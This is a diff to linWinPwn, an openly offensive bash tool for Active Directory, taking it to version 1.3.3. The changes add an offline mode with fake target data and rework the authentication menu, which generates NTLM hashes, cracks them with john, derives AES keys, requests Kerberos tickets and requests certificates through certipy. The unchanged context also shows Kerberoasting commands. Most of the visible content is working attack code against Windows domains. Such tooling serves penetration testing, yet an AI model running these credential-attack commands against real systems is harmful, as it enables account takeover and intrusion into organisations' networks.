@@ -39,6 +39,7 @@ verbose_bool=false
 dnstcp_bool=false
 useip_bool=false
 noexec_bool=false
+offline_bool=false
 
 #Tools variables
 scripts_dir="/opt/lwp-scripts"
@@ -151,7 +152,7 @@ print_banner() {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.3.2 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.3.3 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -182,7 +183,8 @@ help_linWinPwn() {
     echo -e "--dns-ip            Use Custom IP for DNS (instead of the DomainController)"
     echo -e "--dns-tcp           Use TCP protocol for DNS (when possible)"
     echo -e "--use-ip            Use IP addresses instead of hostnames (if DNS issues)"
-    echo -e "--no-exec           Only prints commands to be executed, does not run any tools"
+    echo -e "--no-exec           Only print commands to be executed, do not run any tools"
+    echo -e "--offline           Skip connection and authentication checks"
     echo -e "--verbose           Enable all verbose and debug outputs"
     echo -e "-I/--interface      Attacker's network interface (default: eth0)"
     echo -e "-T/--targets        Target systems for Vuln Scan, SMB Scan, Network Scan and Pwd Dump (Interactive mode default = DC, Auto mode default = All)"
@@ -310,6 +312,23 @@ while test $# -gt 0; do
         ;;
     --no-exec)
         noexec_bool=true
+        args+=("$1")
+        ;;
+    --offline)
+        offline_bool=true
+        noexec_bool=true
+        dc_ip="127.0.0.1"
+        dns_ip="127.0.0.1"
+        dc_domain="domain.local"
+        dc_NETBIOS="dc"
+        user=""
+        password=""
+        domain=""
+        pass_bool=false
+        hash_bool=false
+        kerb_bool=false
+        aeskey_bool=false
+        cert_bool=false
         args+=("$1")
         ;;
     --verbose)
@@ -447,7 +466,7 @@ prepare() {
     if ! stat "${netexec}" >/dev/null 2>&1; then
         echo -e "${RED}[-] Please ensure netexec is installed and try again... ${NC}"
         exit 1
-    else
+    elif [ "${offline_bool}" == "false" ]; then
         dc_info=$(${netexec} ldap --port "${ldap_port}" "${dc_ip}" | grep -v "\[-\]\|Connection refused")
         if [[ $dc_info == *"First time use detected"* ]]; then
             dc_info=$(${netexec} ldap --port "${ldap_port}" "${dc_ip}" | grep -v "\[-\]\|Connection refused")
@@ -460,22 +479,24 @@ prepare() {
             echo -e "${PURPLE}[!] Error connecting to SMB! Please ensure the SMB port is correct and accessible. Attempting to use MSSQL ... ${NC}"
             dc_info=$(${netexec} mssql "${dc_ip}" | grep -v "Connection refused")
         fi
-    fi
-
-    if [ -z "$dc_info" ]; then
-        echo -e "${RED}[-] Error connecting to LDAP, SMB and MSSQL ports of target! Please ensure the target is a Domain Controller and is accessible, and try again... ${NC}"
-        exit 1
-    fi
-
-    # Extract NETBIOS name and domain from dc_info
-    dc_NETBIOS=$(echo "$dc_info" | sed -E 's/.*\((name:)([^)]+)\).*/\2/' | head -n 1)
-
-    # If dc_domain is missing, use the provided dc domain
-    if [ -z "$dc_domain" ]; then
-        dc_domain=$(echo "$dc_info" | sed -E 's/.*\((domain:)([^)]+)\).*/\2/' | head -n 1)
-        if [ -z "$dc_domain" ]; then
-            echo -e "${RED}[-] Error finding DC's domain, please specify it using '--dc-domain'${NC}"
+        if [ -z "$dc_info" ]; then
+            echo -e "${PURPLE}[!] Error connecting to MSSQL! Please ensure the MSSQL port is correct and accessible.${NC}"
+        fi
+        if [ -z "$dc_info" ]; then
+            echo -e "${RED}[-] Error connecting to target! Please ensure the target is a Domain Controller and is accessible, and try again... ${NC}"
             exit 1
+        fi
+
+        # Extract NETBIOS name and domain from dc_info
+        dc_NETBIOS=$(echo "$dc_info" | sed -E 's/.*\((name:)([^)]+)\).*/\2/' | head -n 1)
+
+        # If dc_domain is missing, use the provided dc domain
+        if [ -z "$dc_domain" ]; then
+            dc_domain=$(echo "$dc_info" | sed -E 's/.*\((domain:)([^)]+)\).*/\2/' | head -n 1)
+            if [ -z "$dc_domain" ] && [ "${offline_bool}" == "false" ]; then
+                echo -e "${RED}[-] Error finding DC's domain, please specify it using '--dc-domain'${NC}"
+                exit 1
+            fi
         fi
     fi
 
@@ -531,8 +552,10 @@ prepare() {
     mkdir -p "${Users_dir}"
     mkdir -p "${Scans_dir}"
 
-    if ! stat "${Scans_dir}/${dc_ip}_mainports.txt" >/dev/null 2>&1; then ${nmap} -n -Pn -p 135,445,389,636,88,3389,5985 "${dc_ip}" -sT -T5 --open > "${Scans_dir}/${dc_ip}"_mainports.txt; fi
-    dc_open_ports=$(/bin/cat "${Scans_dir}/${dc_ip}"_mainports.txt)
+    if ! stat "${Scans_dir}/${dc_ip}_mainports.txt" >/dev/null 2>&1 && [ "${offline_bool}" == "false" ]; then
+        ${nmap} -n -Pn -p 135,445,389,636,88,3389,5985 "${dc_ip}" -sT -T5 --open > "${Scans_dir}/${dc_ip}"_mainports.txt;
+        dc_open_ports=$(/bin/cat "${Scans_dir}/${dc_ip}"_mainports.txt)
+    fi
     if [[ $dc_open_ports == *"135/tcp"* ]]; then dc_port_135="${GREEN}open${NC}"; else dc_port_135="${RED}filtered|closed${NC}"; fi
     if [[ $dc_open_ports == *"445/tcp"* ]]; then dc_port_445="${GREEN}open${NC}"; else dc_port_445="${RED}filtered|closed${NC}"; fi
     if [[ $dc_open_ports == *"389/tcp"* ]]; then dc_port_389="${GREEN}open${NC}"; else dc_port_389="${RED}filtered|closed${NC}"; fi
@@ -2713,7 +2736,7 @@ kerberoast_attack() {
                 run_command "${impacket_GetUserSPNs} -no-preauth ${asrep_user} -usersfile ${users_list} -dc-ip ${dc_ip} -dc-host ${dc_NETBIOS} ${dc_domain}" >"${Kerberos_dir}/kerberoast_blind_output_${dc_domain}.txt"
                 if grep -q 'error' "${Kerberos_dir}/kerberoast_blind_output_${dc_domain}.txt"; then
                     echo -e "${RED}[-] Errors during Blind Kerberoast Attack... ${NC}"
-                elif [ "${noexec_bool}" == "false" ];then
+                elif [ "${noexec_bool}" == "false" ]; then
                     grep "krb5tgs" "${Kerberos_dir}/kerberoast_blind_output_${dc_domain}.txt" | tee "${Kerberos_dir}/kerberoast_hashes_${dc_domain}.txt"
                     hash_count=$(wc -l < "${Kerberos_dir}/kerberoast_hashes_${dc_domain}.txt")
                     if [[ ! "${hash_count}" == 0 ]]; then
@@ -2732,7 +2755,7 @@ kerberoast_attack() {
             #${netexec} ${ne_verbose} smb ${curr_targets_list} "${argument_ne}" --kerberoasting --log ${Kerberos_dir}/kerberoast_output_${dc_domain}.txt" 2>&1
             if grep -q 'error' "${Kerberos_dir}/kerberoast_output_${dc_domain}.txt"; then
                 echo -e "${RED}[-] Errors during Kerberoast Attack... ${NC}"
-            elif [ "${noexec_bool}" == "false" ];then
+            elif [ "${noexec_bool}" == "false" ]; then
                 grep "krb5tgs" "${Kerberos_dir}/kerberoast_output_${dc_domain}.txt" >"${Kerberos_dir}/kerberoast_hashes_${dc_domain}.txt"
                 hash_count=$(wc -l < "${Kerberos_dir}/kerberoast_hashes_${dc_domain}.txt")
                 if [[ ! "${hash_count}" == 0 ]]; then
@@ -3668,7 +3691,7 @@ targetedkerberoast_attack() {
                 else
                     echo -e "${PURPLE}[-] Failed to extract hashes!${NC}"
                 fi
-            elif [ "${noexec_bool}" == "false" ];then
+            elif [ "${noexec_bool}" == "false" ]; then
                 echo -e "${PURPLE}[-] No hashes found!${NC}"
             fi
         fi
@@ -3779,7 +3802,7 @@ rbcd_spnless_attack() {
                         echo -e "${CYAN}[!] Run command below to remove impersonation rights:${NC}"
                         echo -e "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} remove rbcd '${target_rbcd}$' '${user_spnless}'"
                     fi
-                elif [ "${noexec_bool}" == "false" ];then
+                elif [ "${noexec_bool}" == "false" ]; then
                     echo -e "${RED}[-] Failed to generate TGT${NC}"
                 fi
                 cd "${current_dir}" || exit
@@ -4653,6 +4676,11 @@ netscan_run() {
 }
 
 print_info() {
+    if [ "${offline_bool}" == "true" ]; then
+        echo -e "${RED}WARNING:${NC} Running in Offline mode, no interaction with target, using fake authentication data\n";
+    elif [ "${noexec_bool}" == "true" ]; then
+        echo -e "${RED}WARNING:${NC} Running in NoExec mode, only printing commands\n"
+    fi
     echo -e "${YELLOW}[i]${NC} Target domain: ${YELLOW}${dc_domain}${NC}"
     echo -e "${YELLOW}[i]${NC} Domain Controller's FQDN: ${YELLOW}${dc_FQDN}${NC}"
     echo -e "${YELLOW}[i]${NC} Domain Controller's IP: ${YELLOW}${dc_ip}${NC}"
@@ -6639,12 +6667,12 @@ auth_menu() {
     echo -e ""
     echo -e "${YELLOW}[Auth menu]${NC} Please choose from the following options:"
     echo -e "----------------------------------------------------"
-    echo -e "1) Generate NTLM hash of current user (requires: password) - Pass the hash"
-    echo -e "2) Crack NTLM hash of current user (requires: NTLM hash)"
-    echo -e "3) Generate TGT for current user (requires: password, NTLM hash or AES key) - Pass the key/Overpass the hash"
-    echo -e "4) Extract NTLM hash from Certificate using PKINIT (requires: pfx certificate)"
+    echo -e "1) Generate NTLM hash of current user - Pass the hash"
+    echo -e "2) Crack NTLM hash of current user"
+    echo -e "3) Generate AES Key using aesKrbKeyGen"
+    echo -e "4) Generate TGT for current user (requires: password, NTLM hash or AES key) - Pass the key/Overpass the hash"
     echo -e "5) Request certificate (requires: authentication)"
-    echo -e "6) Generate AES Key using aesKrbKeyGen (requires: password)"
+    echo -e "6) Extract NTLM hash from Certificate using PKINIT (requires: pfx certificate)"
     echo -e "back) Go back to Init Menu"
     echo -e "exit) Exit"
 
@@ -6660,13 +6688,16 @@ auth_menu() {
         ;;
 
     1)
-        if [ "${pass_bool}" == true ]; then
-            hash_gen="$(iconv -f ASCII -t UTF-16LE <(printf "%s" "$password") | $(which openssl) dgst -md4 | cut -d " " -f 2)"
-            echo -e "${GREEN}[+] NTLM hash generated:${NC} ${hash_gen}"
-            echo -e "${GREEN}[+] Re-run linWinPwn to use hash instead:${NC} linWinPwn -t ${dc_ip} -d ${domain} -u '${user}' -H ${hash_gen}"
-        else
-            echo -e "${RED}[-] Error! Requires password...${NC}"
-        fi
+        echo -e "${BLUE}[*] Please specify password to convert to NTLM (default: current user):${NC}"
+        read -rp ">> " pass_hash_gen </dev/tty
+        if [[ ${pass_hash_gen} == "" ]]; then pass_hash_gen="${password}"; fi
+        while [ "${pass_hash_gen}" == "" ]; do
+            echo -e "${RED}Invalid password.${NC} Please specify password to convert:"
+            read -rp ">> " pass_hash_gen </dev/tty
+        done
+        hash_gen="$(iconv -f ASCII -t UTF-16LE <(printf "%s" "$pass_hash_gen") | $(which openssl) dgst -md4 | cut -d " " -f 2)"
+        echo -e "${GREEN}[+] NTLM hash generated:${NC} ${hash_gen}"
+        echo -e "${GREEN}[+] Re-run linWinPwn to use hash instead:${NC} linWinPwn -t ${dc_ip} -d ${domain} -u '${user}' -H ${hash_gen}"
         auth_menu
         ;;
 
@@ -6674,26 +6705,52 @@ auth_menu() {
         if ! stat "${john}" >/dev/null 2>&1; then
             echo -e "${RED}[-] Please verify the installation of john${NC}"
         else
-            if [ "${hash_bool}" == true ]; then
-                echo "$hash" | cut -d ":" -f 2 >"${Credentials_dir}/ntlm_hash"
-                echo -e "${CYAN}[*] Cracking NTLM hash using john the ripper${NC}"
-                run_command "$john ${Credentials_dir}/ntlm_hash --format=NT --wordlist=$pass_wordlist" | tee "${Credentials_dir}/johnNTLM_output_${dc_domain}.txt"
-                john_out=$($john "${Credentials_dir}/ntlm_hash" --format=NT --show)
-                if [[ "${john_out}" == *"1 password"* ]]; then
-                    password_cracked=$(echo "$john_out" | cut -d ":" -f 2 | cut -d " " -f 1)
-                    echo -e "${GREEN}[+] NTLM hash successfully cracked:${NC} $password_cracked"
-                    echo -e "${GREEN}[+] Re-run linWinPwn to use password instead:${NC} linWinPwn -t ${dc_ip} -d ${domain} -u '${user}' -p ${password_cracked}"
-                else
-                    echo -e "${RED}[-] Failed to crack NTLM hash${NC}"
-                fi
+            echo -e "${BLUE}[*] Please specify NTLM hash to crack (default: current user):${NC}"
+            read -rp ">> " hash_pass_gen </dev/tty
+            if [[ ${hash_pass_gen} == "" ]]; then hash_pass_gen="${hash}"; fi
+            while [ "${hash_pass_gen}" == "" ]; do
+                echo -e "${RED}Invalid NTLM hash.${NC} Please specify NTLM hash to crack:"
+                read -rp ">> " hash_pass_gen </dev/tty
+            done
+            echo "$hash_pass_gen" | cut -d ":" -f 2 >"${Credentials_dir}/ntlm_hash"
+            echo -e "${CYAN}[*] Cracking NTLM hash using john the ripper${NC}"
+            ${john} "${Credentials_dir}/ntlm_hash" --format=NT --wordlist="${pass_wordlist}" | tee "${Credentials_dir}/johnNTLM_output_${dc_domain}.txt"
+            john_out=$(${john} "${Credentials_dir}/ntlm_hash" --format=NT --show)
+            if [[ "${john_out}" == *"1 password"* ]]; then
+                password_cracked=$(echo "$john_out" | head -n 1 | cut -d ":" -f 2 | cut -d " " -f 1)
+                echo -e "${GREEN}[+] NTLM hash successfully cracked:${NC} $password_cracked"
+                echo -e "${GREEN}[+] Re-run linWinPwn to use password instead:${NC} linWinPwn -t ${dc_ip} -d ${domain} -u '${user}' -p ${password_cracked}"
             else
-                echo -e "${RED}[-] Error! Requires NTLM hash...${NC}"
+                echo -e "${RED}[-] Failed to crack NTLM hash${NC}"
             fi
         fi
         auth_menu
         ;;
 
     3)
+        if ! stat "${aesKrbKeyGen}" >/dev/null 2>&1; then
+            echo -e "${RED}[-] Please verify the installation of aesKrbKeyGen.py${NC}"
+        else
+            echo -e "${BLUE}[*] Please specify password to convert to AES (default: current user):${NC}"
+            read -rp ">> " aes_pass_gen </dev/tty
+            if [[ ${aes_pass_gen} == "" ]]; then aes_pass_gen="${password}"; fi
+            while [ "${aes_pass_gen}" == "" ]; do
+                echo -e "${RED}Invalid password.${NC} Please specify password to convert:"
+                read -rp ">> " aes_pass_gen </dev/tty
+            done
+            aes_gen=$("${python3}" "${aesKrbKeyGen}" -domain "${domain}" -u "'${user}'" -pass "${aes_pass_gen}")
+            aes_key=$(echo -e "${aes_gen}" | grep "AES256" | cut -d " " -f 4)
+            if [[ ! "${aes_key}" == "" ]]; then
+                echo -e "${GREEN}[+] AES Keys generated:${NC}\n${aes_gen}"
+                echo -e "${GREEN}[+] Re-run linWinPwn to use AES key instead:${NC} linWinPwn -t ${dc_ip} -d ${domain} -u '${user}' -A ${aes_key}"
+            elif [ "${noexec_bool}" == "false" ]; then
+                echo -e "${RED}[-] Error generating AES Keys${NC}"
+            fi
+        fi
+        auth_menu
+        ;;
+
+    4)
         if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
             echo -e "${CYAN}[*] Requesting TGT for current user${NC}"
             krb_ticket="${Credentials_dir}/${user}"
@@ -6701,7 +6758,7 @@ auth_menu() {
             if stat "${krb_ticket}.ccache" >/dev/null 2>&1; then
                 echo -e "${GREEN}[+] TGT generated successfully:${NC} '$krb_ticket.ccache'"
                 echo -e "${GREEN}[+] Re-run linWinPwn to use ticket instead:${NC} linWinPwn -t ${dc_ip} -d ${domain} -u '${user}' -K '${krb_ticket}.ccache'"
-            else
+            elif [ "${noexec_bool}" == "false" ]; then
                 echo -e "${RED}[-] Failed to generate TGT${NC}"
             fi
         else
@@ -6710,7 +6767,54 @@ auth_menu() {
         auth_menu
         ;;
 
-    4)
+    5)
+        if ! stat "${certipy}" >/dev/null 2>&1; then
+            echo -e "${RED}[-] Please verify the installation of certipy${NC}"
+        else
+            if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ] || [ "${aeskey_bool}" == true ] || [ "${kerb_bool}" == true ]; then
+                ne_adcs_enum
+                if [ ! "${pki_servers}" == "" ] && [ ! "${pki_cas}" == "" ]; then
+                    current_dir=$(pwd)
+                    cd "${Credentials_dir}" || exit
+                    i=0
+                    for pki_server in $pki_servers; do
+                        i=$((i + 1))
+                        pki_ca=$(echo -e "$pki_cas" | sed 's/ /\n/g' | sed -n ${i}p)
+                        if [ "${ldaps_bool}" == true ]; then
+                            ldaps_param=""
+                            if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param=""; else ldapbindsign_param="-no-ldap-channel-binding"; fi
+                        else
+                            ldaps_param="-ldap-scheme ldap"
+                            if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param=""; else ldapbindsign_param="-no-ldap-signing"; fi
+                        fi
+                        if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
+                        run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} ${dnstcp_param} -target ${pki_server} -ca \"${pki_ca//SPACE/ }\" -template User -key-size 4096 ${ldaps_param} ${ldapbindsign_param}" | tee "${Credentials_dir}/certipy_reqcert_output_${user_var}.txt"
+                    done
+                    cd "${current_dir}" || exit
+                else
+                    echo -e "${PURPLE}[-] No ADCS servers found! Please re-run ADCS enumeration and try again..${NC}"
+                fi
+                if stat "${Credentials_dir}/${user}.pfx" >/dev/null 2>&1; then
+                    pfxcert="${Credentials_dir}/${user}.pfx"
+                    pfxpass=""
+                    echo -e "${GREEN}[+] PFX Certificate requested successfully:${NC} '${Credentials_dir}/${user}.pfx'"
+                    $(which openssl) pkcs12 -in "${Credentials_dir}/${user}.pfx" -out "${Credentials_dir}/${user}.pem" -nodes -passin pass:""
+                    if stat "${Credentials_dir}/${user}.pem" >/dev/null 2>&1; then
+                        pem_cert="${Credentials_dir}/${user}.pem"
+                        echo -e "${GREEN}[+] PFX Certificate converted to PEM successfully:${NC} '${pem_cert}'"
+                    fi
+                    echo -e "${GREEN}[+] Re-run linWinPwn to use certificate instead:${NC} linWinPwn -t ${dc_ip} -d ${domain} -u '${user}' -C '${pfxcert}'"
+                elif [ "${noexec_bool}" == "false" ]; then
+                    echo -e "${RED}[-] Failed to request certificate${NC}"
+                fi
+            else
+                echo -e "${RED}[-] Error! Requires password, NTLM hash, AES key or Kerberos ticket...${NC}"
+            fi
+        fi
+        auth_menu
+        ;;
+
+    6)
         if ! stat "${certipy}" >/dev/null 2>&1; then
             echo -e "${RED}[-] Please verify the installation of certipy${NC}"
         else
@@ -6733,68 +6837,6 @@ auth_menu() {
         auth_menu
         ;;
 
-    5)
-        if ! stat "${certipy}" >/dev/null 2>&1; then
-            echo -e "${RED}[-] Please verify the installation of certipy${NC}"
-        else
-            if [ "${pass_bool}" == true ] || [ "${hash_bool}" == true ] || [ "${aeskey_bool}" == true ] || [ "${kerb_bool}" == true ]; then
-                ne_adcs_enum
-                current_dir=$(pwd)
-                cd "${Credentials_dir}" || exit
-                i=0
-                for pki_server in $pki_servers; do
-                    i=$((i + 1))
-                    pki_ca=$(echo -e "$pki_cas" | sed 's/ /\n/g' | sed -n ${i}p)
-                    if [ "${ldaps_bool}" == true ]; then
-                        ldaps_param=""
-                        if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param=""; else ldapbindsign_param="-no-ldap-channel-binding"; fi
-                    else
-                        ldaps_param="-ldap-scheme ldap"
-                        if [ "${ldapbindsign_bool}" == true ]; then ldapbindsign_param=""; else ldapbindsign_param="-no-ldap-signing"; fi
-                    fi
-                    if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
-                    run_command "${certipy} req ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} ${dnstcp_param} -target ${pki_server} -ca \"${pki_ca//SPACE/ }\" -template User -key-size 4096 ${ldaps_param} ${ldapbindsign_param}" | tee "${Credentials_dir}/certipy_reqcert_output_${user_var}.txt"
-                done
-                cd "${current_dir}" || exit
-                if stat "${Credentials_dir}/${user}.pfx" >/dev/null 2>&1; then
-                    pfxcert="${Credentials_dir}/${user}.pfx"
-                    pfxpass=""
-                    echo -e "${GREEN}[+] PFX Certificate requested successfully:${NC} '${Credentials_dir}/${user}.pfx'"
-                    $(which openssl) pkcs12 -in "${Credentials_dir}/${user}.pfx" -out "${Credentials_dir}/${user}.pem" -nodes -passin pass:""
-                    if stat "${Credentials_dir}/${user}.pem" >/dev/null 2>&1; then
-                        pem_cert="${Credentials_dir}/${user}.pem"
-                        echo -e "${GREEN}[+] PFX Certificate converted to PEM successfully:${NC} '${pem_cert}'"
-                    fi
-                    echo -e "${GREEN}[+] Re-run linWinPwn to use certificate instead:${NC} linWinPwn -t ${dc_ip} -d ${domain} -u '${user}' -C '${pfxcert}'"
-                else
-                    echo -e "${RED}[-] Failed to request certificate${NC}"
-                fi
-            else
-                echo -e "${RED}[-] Error! Requires password, NTLM hash, AES key or Kerberos ticket...${NC}"
-            fi
-        fi
-        auth_menu
-        ;;
-
-    6) 
-        if ! stat "${aesKrbKeyGen}" >/dev/null 2>&1; then
-            echo -e "${RED}[-] Please verify the installation of aesKrbKeyGen.py${NC}"
-        else
-            if [ "${pass_bool}" == true ]; then
-                aes_gen=$("${python3}" "${aesKrbKeyGen}" -domain "${domain}" -u "'${user}'" -pass "${password}")
-                aes_key=$(echo -e "${aes_gen}" | grep "AES256" | cut -d " " -f 4)
-                if [[ ! "${aes_key}" == "" ]]; then 
-                    echo -e "${GREEN}[+] AES Keys generated:${NC} ${aes_gen}"
-                    echo -e "${GREEN}[+] Re-run linWinPwn to use AES key instead:${NC} linWinPwn -t ${dc_ip} -d ${domain} -u '${user}' -A ${aes_key}"
-                else
-                    echo -e "${RED}[-] Error generating AES Keys${NC}"
-                fi
-            else
-                echo -e "${RED}[-] Error! Requires password...${NC}"
-            fi
-        fi
-        auth_menu
-        ;;
     back)
         init_menu
         ;;
